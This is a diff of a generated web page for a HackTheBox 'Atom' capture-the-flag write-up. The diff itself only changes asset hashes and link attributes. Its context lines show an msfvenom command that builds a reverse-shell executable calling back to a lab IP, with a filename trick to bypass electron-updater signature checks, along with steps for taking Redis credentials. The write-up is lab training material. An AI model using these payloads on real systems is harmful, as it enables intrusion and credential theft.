@@ -260,7 +260,7 @@
   
   
   
-  <link rel="stylesheet" href="/css/wowchemy.8028d170b3ecf9438246932e1cbcdf6c.css" />
+  <link rel="stylesheet" href="/css/wowchemy.a5f2a0403faf5be0213f07cb8d40527c.css" />
 
   
 
@@ -281,8 +281,8 @@
     <link rel="manifest" href="/index.webmanifest" />
   
 
-  <link rel="icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_32x32_fill_lanczos_center_2.png" />
-  <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_180x180_fill_lanczos_center_2.png" />
+  <link rel="icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_32x32_fill_lanczos_center_3.png" />
+  <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_180x180_fill_lanczos_center_3.png" />
 
   <link rel="canonical" href="https://mohamed-elleuch.me/writeups/htb-atom/" />
 
@@ -341,7 +341,7 @@
   
   
   
-  <script src="/js/wowchemy-init.min.76abe0ff166961e9adc403995f18189f.js"></script>
+  <script src="/js/wowchemy-init.min.eca9bbc7a71accd5ebd9eee0ff004132.js"></script>
 
   
 
@@ -746,7 +746,7 @@ We only have a pdf file!
 <p>The Heedv1 app is build with <code>electron-builder</code> and also we can drop updates in the client folders in the smb and it get executed.
 Searching in  google for an electron builder update rce, we can find an interesting</p>
 <blockquote>
-<p><a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html</a></p>
+<p><a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html" target="_blank" rel="noopener">https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html</a></p>
 </blockquote>
 <p>Let&rsquo;s first create our shell with the name &ldquo;s&rsquo;hell.exe&rdquo; to bypass the signature</p>
 <pre><code>msfvenom -p windows/shell_reverse_tcp  lhost=10.10.14.5 lport=9001 -f exe -o &quot;s'hell.exe&quot;
@@ -771,7 +771,7 @@ sha512: CZsOB2[-SNIP-]2tW5UhzwqzLVkkpzAbuIw==
 <img src="portable.png">
 <p>We  can copy the whole folder and try to retrieve the encrypted like the machine <code>sharp</code> but let&rsquo;s keep enumerating!</p>
 <blockquote>
-<p><a href="https://www.exploit-db.com/exploits/49409">https://www.exploit-db.com/exploits/49409</a></p>
+<p><a href="https://www.exploit-db.com/exploits/49409" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/49409</a></p>
 </blockquote>
 <img src="redis.png">
 <p>We can see that Redis is installed, we can grab the redis password from the config file</p>
@@ -783,7 +783,7 @@ sha512: CZsOB2[-SNIP-]2tW5UhzwqzLVkkpzAbuIw==
 <pre><code>sudo apt-get install redis-tools
 </code></pre>
 <blockquote>
-<p>A very good ressource, i&rsquo;ll use everything from here <a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</a></p>
+<p>A very good ressource, i&rsquo;ll use everything from here <a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis" target="_blank" rel="noopener">https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</a></p>
 </blockquote>
 <p>Let&rsquo;s dump the database</p>
 <pre><code class="language-redis">info
@@ -1204,7 +1204,7 @@ print('[+] Decrypted Password: '+decode('Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'))
       
     
     
-    <script src="/en/js/wowchemy.min.a10ad2a6b25aea7a22d6392d483b454d.js"></script>
+    <script src="/en/js/wowchemy.min.e20609e6ad3f7fce339ee2e74f13682b.js"></script>
 
     
 
